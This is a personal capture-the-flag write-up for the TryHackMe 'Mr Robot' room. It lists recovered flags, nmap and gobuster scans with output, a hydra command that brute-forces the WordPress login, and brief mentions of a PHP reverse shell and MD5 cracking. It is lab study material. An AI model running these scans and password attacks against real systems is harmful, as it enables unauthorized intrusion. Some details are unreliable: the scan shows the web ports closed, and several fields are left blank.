---
cssclasses:
  - jbm-note
Date: 2026-05-21
tags:
  - THMChallenge
---
# Challenge

| **Target**            | *Try hack me machine(room: mrrobot)* |
| --------------------- | ------------------------------------ |
| Date                  | 21/5/2026                            |
| Main attack type      | ...                                  |
| Secondary attack type | ...                                  |
| Tools:                | ...                                  |
| Criticality:          | **...**                              |

---
# **RESULTS**
---
## Flags found
- *073403c8a58a1f80d943455fb30724b9*
- *822c73956184f694993bede3eb39f95*
- *04787ddef27c3dee1ee161b21670b4e4*

---
# Preparation
---
## Getting the PHP payload
Basic PHP reverse shell.

---
# Initial investigation/enumeration
---
## **Enumeration**
### NMAP
```bash
sudo nmap -sS -sV 10.80.177.109 -oA nmapscan
```
```
22/tcp  closed ssh
80/tcp  closed http
443/tcp closed https
```
## GOBUSTER
Wordlists: **`fsocity.dic`** (found from `/robots.txt`)
```bash
gobuster dir -u 10.80.177.109 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -q -o gobuster/gobuster-small.txt
```
```
images               (Status: 301) [Size: 236] [--> http://10.80.177.109/images/]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 301) [Size: 0] [--> http://10.80.177.109/%23%20license,%20visit%20http:/creativecommons.org/licenses/by-sa/3.0/]
blog                 (Status: 301) [Size: 234] [--> http://10.80.177.109/blog/]
sitemap              (Status: 200) [Size: 0]
login                (Status: 302) [Size: 0] [--> http://10.80.177.109/wp-login.php]
rss                  (Status: 301) [Size: 0] [--> http://10.80.177.109/feed/]
video                (Status: 301) [Size: 235] [--> http://10.80.177.109/video/]
0                    (Status: 301) [Size: 0] [--> http://10.80.177.109/0/]
feed                 (Status: 301) [Size: 0] [--> http://10.80.177.109/feed/]
wp-content           (Status: 301) [Size: 240] [--> http://10.80.177.109/wp-content/]
image                (Status: 301) [Size: 0] [--> http://10.80.177.109/image/]
admin                (Status: 301) [Size: 235] [--> http://10.80.177.109/admin/]
atom                 (Status: 301) [Size: 0] [--> http://10.80.177.109/feed/atom/]
audio                (Status: 301) [Size: 235] [--> http://10.80.177.109/audio/]
intro                (Status: 200) [Size: 516314]
css                  (Status: 301) [Size: 233] [--> http://10.80.177.109/css/]
wp-login             (Status: 200) [Size: 2613]
rss2                 (Status: 301) [Size: 0] [--> http://10.80.177.109/feed/]
license              (Status: 200) [Size: 309]
wp-includes          (Status: 301) [Size: 241] [--> http://10.80.177.109/wp-includes/]
js                   (Status: 301) [Size: 232] [--> http://10.80.177.109/js/]
Image                (Status: 301) [Size: 0] [--> http://10.80.177.109/Image/]
rdf                  (Status: 301) [Size: 0] [--> http://10.80.177.109/feed/rdf/]
page1                (Status: 301) [Size: 0] [--> http://10.80.177.109/]
readme               (Status: 200) [Size: 64]
robots               (Status: 200) [Size: 41]
```
## **Vulnerability scanning**
### Robots.txt
`robots.txt` exposes the first key.
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

### Word press login
From the GOBUSTER results, we find a WordPress login. This allows us to brute force this login page.
```Bash
hydra -l Elliot -P fsocity.dic 10.80.177.109 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
```
This gives us the password (from the show): *ER28-0652*

After logging in we can input a PHP payload.

### Hash cracking
After finding a reverse shell, there is a file which contains a **md5** hashed file that contains a password in `/home/robot`. Cracking it gives us the text: **`abcdefghijklmnopqrstuvwxyz`**.

After switching users, we can read the second flag file.


---
# Exploiting and  Investigation
---

## First key
After inspecting the website, we can also inspect the `robots.txt` to find the first key through `http://10.80.177.109/key-1-of-3.txt`.

## Second key
Using horizontal movement we can find the second flag.

## Third key
The root user has the third key.